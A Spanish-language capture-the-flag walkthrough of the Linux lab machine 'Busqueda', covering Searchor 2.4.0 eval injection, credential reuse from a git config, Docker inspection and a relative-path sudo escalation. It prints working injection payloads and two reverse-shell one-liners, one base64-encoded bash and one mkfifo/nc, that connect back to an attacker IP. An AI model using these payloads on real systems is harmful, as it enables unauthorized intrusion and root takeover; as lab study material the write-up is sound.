## Resumen
Busqueda es una máquina Linux de dificultad Easy que implica explotar una vulnerabilidad de inyección de comandos presente en un módulo de Python Searchor 2.4.0. Aprovechando esta vulnerabilidad, obtenemos acceso a nivel de usuario en la máquina.

Para escalar privilegios a root, descubrimos credenciales dentro de un archivo de configuración de Git, lo que nos permite iniciar sesión en un servicio local de Gitea. Además, descubrimos que un script de comprobación del sistema puede ejecutarse con privilegios de root por un usuario específico.

Utilizando este script, enumeramos contenedores de Docker que revelan credenciales para la cuenta del administrador de Gitea. Un análisis más profundo del código fuente del script de comprobación del sistema en un repositorio Git revela una forma de explotar una referencia de ruta relativa, otorgándonos Ejecución Remota de Código (RCE) con privilegios de root.
### Herramientas
- Nmap
- Gobuster
- Penelope
- Cyberchef
## Escaneo y Enumeración

Hacemos un escaneo rápido de todos los puertos TCP y nos muestra el puerto 22 y 80 abiertos
```bash
sudo nmap -sS -Pn -p- -T4 --min-rate 5000 10.129.27.21
```

![](/img/Pasted%20image%2020260430144733.png)

Ahora haré un escaneo de versión más específico a dichos puertos, para tener más información. A primera vista podemos ver que la ip no nos redirige a ninguna página, para ello hay que añadir searcher.htb a los hosts 

```bash
sudo nmap -sCV -p22,80 10.129.27.21
```

![](/img/Pasted%20image%2020260430144938.png)

Una vez añadido enumeraremos con gobuster los directorios que tiene para un posible vector de ataque. No encontramos nada de valor, así que seguiremos mirando la propia página web

```bash
gobuster dir --url http://searcher.htb/ --wordlist /usr/share/wordlists/DirectoryDiscovery/common.txt -t 100
```

![](/img/Pasted%20image%2020260430145144.png)


Al entrar encontraremos una página como la siguiente, con un buscador y para seleccionar el propio motor de búsqueda, en lo que nos podemos fijar también es que el software que usa es Flask y Searchor 2.4.0

![](/img/Pasted%20image%2020260430145530.png) 

Al hacer una búsqueda de prueba nos mostrará una url de con la petición que hacer, cosa que no nos servirá  

![](/img/Pasted%20image%2020260430145649.png)

Al entrar en el enlace del software de Searchor iremos hacía el repositorio de éste y en los lanzamientos encontraremos que en la versión posterior 2.4.2 arreglaron una vulnerabilidad 


![](/img/Pasted%20image%2020260430145957.png) 

![](/img/Pasted%20image%2020260430145934.png)

Mirando de que trata el arreglo de la vulnerabilidad habla de que hay una inyección de código en la variable eval

![](/img/Pasted%20image%2020260430150300.png) 


En el propio commit podemos ver a que se refiere y esto nos dará un vector de ataque

![](/img/Pasted%20image%2020260430150400.png) 

Viendo el código podemos comprobar que tenemos acceso al parámetro engine y query


```bash
wget https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.zip
unzip v2.4.0.zip
```

![](/img/Pasted%20image%2020260430150851.png) 

Lo que sabemos es que engine está predefinido en los navegadores dados así que debemos meter la inyección de código en el query. Así que emplearemos un payload como el siguiente para explotar la vulnerabilidad. Es importante el *#* para que nos comente lo que sigue de código

```bash
') + str(__import__('os').system('id')) #
``` 

Vamos a probarlo en la página web para ver si nos da el resultado que queremos. Y tendremos con acceso ejecución de código como *svc*

![](/img/Pasted%20image%2020260430151612.png)

![](/img/Pasted%20image%2020260430151707.png)


## Explotación

Para el ataque introduciremos en el payload una reverse shell, mientras tanto tendremos en segundo plano nuestro listener preparado. Para la reverse shell traduciremos el payload a base64  con una simple herramienta como cyberchef

```python
python3 ../../../penelope.py 
```

![](/img/Pasted%20image%2020260430152033.png)


Con lo que nuestro payload final se verá de la siguiente forma

```bash
')+ str(__import__('os').system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODAvNDQ0NCAwPiYx | base64 -d | bash'))#
```

![](/img/Pasted%20image%2020260430152232.png) 


Lo enviamos y nuestro listener habrá obtenido exitosamente acceso al sistema y tendremos accesos a la primer flag

![](/img/Pasted%20image%2020260430152312.png)

![](/img/Pasted%20image%2020260430152424.png)


## Escalada de privilegios

Adentrándonos en los archivos podemos ver que tiene un directorio de git en el que hay información que puede ser valiosa

![](/img/Pasted%20image%2020260430152943.png)

Viendo el fichero de configuración  podemos observar que hay un usuario y contraseña hacia otro hosts llamado gitea.searcher.htb, con lo que debemos añadirlo al fichero hosts

![](/img/Pasted%20image%2020260430153049.png)

Use la contraseña en el sistema con el propio usuario svc y fue válido, reutilizaron la contraseña con lo que tendremos un acceso al sistema más estable, además de poder ver los comandos que podemos usar como root que nos servirá par escalar privilegios

![](/img/Pasted%20image%2020260430153303.png) 

No tenemos permisos de lectura en el script así que seguiremos con el host nuevo descubierto

![](/img/Pasted%20image%2020260430153528.png)

Encontraremos una página sobre Gitea en la que además habrá un login.

> [!GITEA]
> Gitea es un paquete de software de código abierto para alojar el control de versiones de desarrollo de software utilizando Git, así como otras funciones de colaboración como el seguimiento de errores y los wikis 

![](/img/Pasted%20image%2020260430153646.png) 

En los usuario podemos ver que hay dos usuarios, administrator y cody previamente visto en el fichero de configuración

![](/img/Pasted%20image%2020260430153936.png) 

Si iniciamos sesión como cody con las credenciales de cody tendremos acceso a su repositorio pero no encontramos nada que no hayamos podido ver

![](/img/Pasted%20image%2020260430154250.png)

Siguiendo con los permisos que tiene el usuario svc al ejecutar el programa nos dice que debe usarse de la siguiente forma, tenemos opciones de docker más una más que hace un full-checkup. 

![](/img/Pasted%20image%2020260430154240.png)

Así que veremos su uso y que podemos hacer con ello. Con docker-ps veremos que contenedores tiene abiertos, tiene uno con nombre gitea y otro mysql_db. Con docker-inspect nos dice que debemos poner un formato y el nombre del contenedor

![](/img/Pasted%20image%2020260430154643.png)

![](/img/Pasted%20image%2020260430154739.png) 

Viendo la guía de docker nos dice que el formato puede ser por ejemplo en json y para ello ponerlo entre llaves. Así que haremos que nos muestre lo que hay en el contenedor de gitea

![](/img/Pasted%20image%2020260430154858.png)

![](/img/Pasted%20image%2020260430155100.png) 

Así que para leerlo lo haremos de la siguiente forma, le añadiremos al final el comando jq para leer correctamente el formato json que viene ya con la propia máquina. Mirando la información encontraremos unas credenciales para gitea

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
```

![](/img/Pasted%20image%2020260430155413.png) 

Las probamos con el usuario visto administrator en la página y estaremos dentro, ahora podemos comprobar los scripts y el que nos interesa que es *system-checkup.sh*. Se puede observar que la parte de full-checkup son unas simple líneas en las que se ejecuta desde el mismo directorio (/opt/scripts) ya que dispone de "./". Con lo que iremos a investigarlo y ejecutarlo

![](/img/Pasted%20image%2020260430155808.png) 

Una vez ejecutado desde el directorio lo hará correctamente , así que ya sabemos que debemos hacer un script llamado igual que contenga una reverse shell y ejecutarlo ya que no es una ruta absoluta, eso significa que podremos ejecutarlo en cualquier lado mientras este en el directorio que lo contenga

![](/img/Pasted%20image%2020260430160019.png)

Para ello crearemos el script en el directorio /tmp con la reverse shell, darle permisos de ejecución y debemos escuchar desde el puerto dado, seguidamente ejecutarlo y tendremos permisos de root

```bash
echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.10.14.180 9001 >/tmp/f" > /tmp/full-checkup.sh
```

![](/img/Pasted%20image%2020260430160807.png) 

Y concluiremos la máquina habiendo conseguido escalar a root y teniendo acceso a la última flag

![](/img/Pasted%20image%2020260430160859.png) 

